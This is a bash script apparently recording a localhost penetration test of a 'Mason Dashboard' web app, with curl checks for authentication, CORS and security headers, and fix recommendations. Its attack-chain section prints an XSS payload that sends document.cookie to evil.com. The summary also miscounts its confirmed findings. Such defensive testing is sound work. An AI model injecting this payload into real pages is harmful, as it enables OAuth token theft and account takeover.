#!/bin/bash
# Security Penetration Testing - Exploit Commands
# Target: http://localhost:3000 (Mason Dashboard)
# Authorization: Localhost white-box testing only
# Date: 2026-02-06

echo "==================================================================="
echo "MASON SECURITY PENTEST - EXPLOITATION COMMANDS"
echo "==================================================================="
echo ""
echo "‚ö†Ô∏è  WARNING: ONLY run against localhost:3000"
echo "‚ö†Ô∏è  Non-destructive testing only"
echo ""

# ============================================================================
# AUTH-001: Non-httpOnly OAuth Cookie (CODE REVIEW)
# ============================================================================
echo "=== AUTH-001: Non-httpOnly OAuth Cookie (HIGH) ==="
echo "File: src/app/api/auth/supabase/callback/route.ts:76"
echo ""
echo "Evidence:"
grep -A5 "httpOnly" packages/mason-dashboard/src/app/api/auth/supabase/callback/route.ts | head -10
echo ""
echo "Status: ‚úÖ CONFIRMED via code review"
echo "Impact: XSS can steal OAuth tokens for 60 seconds"
echo ""

# ============================================================================
# AUTH-002: Supabase Proxy Lacks Session Auth
# ============================================================================
echo "=== AUTH-002: Supabase Proxy Without Session (MEDIUM) ==="
echo "Testing: GET /api/supabase/projects with fake bearer token"
echo ""
curl -s -w "\nHTTP Status: %{http_code}\n" \
  http://localhost:3000/api/supabase/projects \
  -H 'Authorization: Bearer fake_token_12345'
echo ""
echo "Status: ‚ö†Ô∏è  NOT EXPLOITABLE (Supabase validates JWT)"
echo "Recommendation: Add NextAuth session check for defense-in-depth"
echo ""

# ============================================================================
# AUTH-003: Unauthenticated Token Refresh
# ============================================================================
echo "=== AUTH-003: Token Refresh Without Session (MEDIUM) ==="
echo "Testing: POST /api/auth/supabase/refresh with fake token"
echo ""
curl -s -w "\nHTTP Status: %{http_code}\n" \
  -X POST http://localhost:3000/api/auth/supabase/refresh \
  -H 'Content-Type: application/json' \
  -d '{"refreshToken": "fake_refresh_token"}'
echo ""
echo "Status: ‚ö†Ô∏è  NOT EXPLOITABLE (Supabase validates token)"
echo "Recommendation: Add NextAuth session check for defense-in-depth"
echo ""

# ============================================================================
# AUTH-006: Unauthenticated Health Endpoint
# ============================================================================
echo "=== AUTH-006: Health Endpoint Info Disclosure (LOW) ==="
echo "Testing: GET /api/health without authentication"
echo ""
curl -s -w "\nHTTP Status: %{http_code}\n" \
  http://localhost:3000/api/health
echo ""
echo "Status: ‚úÖ CONFIRMED (returns system status without auth)"
echo "Impact: Low - exposes timestamp, DLQ metrics"
echo "Recommendation: Add API key auth or limit to {\"status\":\"ok\"}"
echo ""

# ============================================================================
# AUTH-008: OpenAPI CORS Wildcard
# ============================================================================
echo "=== AUTH-008: OpenAPI Wildcard CORS (LOW) ==="
echo "Testing: GET /api/docs/openapi.json from evil.com origin"
echo ""
curl -s -D - \
  -H 'Origin: https://evil.com' \
  http://localhost:3000/api/docs/openapi.json \
  -o /dev/null 2>&1 | grep -i "access-control"
echo ""
echo "Status: ‚úÖ CONFIRMED (Access-Control-Allow-Origin: *)"
echo "Impact: OpenAPI spec readable from any origin"
echo "Recommendation: Restrict CORS or add rate limiting"
echo ""

# ============================================================================
# HDR-001: Missing Content-Security-Policy
# ============================================================================
echo "=== HDR-001: Missing CSP Header (HIGH) ==="
echo "Testing: GET / and checking for CSP header"
echo ""
echo "Root page:"
curl -s -D - http://localhost:3000/ -o /dev/null 2>&1 | grep -i "content-security-policy"
if [ $? -ne 0 ]; then
  echo "‚ùå NO CSP HEADER FOUND"
fi
echo ""
echo "Admin backlog page:"
curl -s -D - http://localhost:3000/admin/backlog -o /dev/null 2>&1 | grep -i "content-security-policy"
if [ $? -ne 0 ]; then
  echo "‚ùå NO CSP HEADER FOUND"
fi
echo ""
echo "Status: ‚úÖ CONFIRMED (no CSP on any page)"
echo "Impact: HIGH - no XSS protection, enables attack chain with AUTH-001"
echo "Recommendation: Add CSP via next.config.mjs headers"
echo ""

# ============================================================================
# HDR-002: Positive Security Headers Check
# ============================================================================
echo "=== HDR-002: Positive Security Headers (INFO) ==="
echo "Checking which security headers ARE present..."
echo ""
curl -s -D - http://localhost:3000/ -o /dev/null 2>&1 | grep -E "X-Content-Type|X-Frame|X-XSS|Referrer-Policy|Permissions-Policy"
echo ""
echo "Status: ‚úÖ POSITIVE (5 security headers present)"
echo "Present: X-Content-Type-Options, X-Frame-Options, X-XSS-Protection,"
echo "         Referrer-Policy, Permissions-Policy"
echo ""

# ============================================================================
# ATTACK CHAIN DEMONSTRATION
# ============================================================================
echo "==================================================================="
echo "CRITICAL ATTACK CHAIN: XSS ‚Üí Token Theft"
echo "==================================================================="
echo ""
echo "Prerequisites:"
echo "  1. HDR-001: No CSP header (‚úÖ confirmed)"
echo "  2. AUTH-001: Non-httpOnly cookie (‚úÖ confirmed)"
echo ""
echo "Attack scenario:"
echo "  1. Attacker finds XSS vulnerability"
echo "  2. Injects: <script>fetch('https://evil.com/steal?t='+document.cookie)</script>"
echo "  3. Script executes (no CSP blocking)"
echo "  4. supabase_oauth_tokens cookie read by JavaScript"
echo "  5. OAuth tokens sent to attacker"
echo "  6. Account takeover complete"
echo ""
echo "Risk Level: HIGH"
echo "Likelihood: MEDIUM (requires XSS)"
echo "Impact: HIGH (full account takeover)"
echo ""

# ============================================================================
# SUMMARY
# ============================================================================
echo "==================================================================="
echo "EXPLOITATION SUMMARY"
echo "==================================================================="
echo ""
echo "Findings tested: 7"
echo "  ‚úÖ Confirmed exploitable: 3 (AUTH-001, AUTH-006, AUTH-008, HDR-001)"
echo "  ‚ö†Ô∏è  Mitigated: 2 (AUTH-002, AUTH-003)"
echo "  ‚ÑπÔ∏è  Informational: 1 (HDR-002)"
echo ""
echo "Severity breakdown:"
echo "  üî¥ HIGH: 2 (AUTH-001, HDR-001)"
echo "  üü° MEDIUM: 2 (AUTH-002, AUTH-003)"
echo "  üü¢ LOW: 2 (AUTH-006, AUTH-008)"
echo ""
echo "Priority fixes:"
echo "  P0: Add CSP header + Make OAuth cookie httpOnly"
echo "  P1: Add session validation to proxy endpoints"
echo "  P2: Restrict health endpoint + Tighten OpenAPI CORS"
echo ""
echo "Full report: .claude/security-pentest/exploitation/EXPLOITATION_SUMMARY.md"
echo "Evidence: .claude/security-pentest/exploitation/{auth,headers}-evidence.json"
echo "==================================================================="
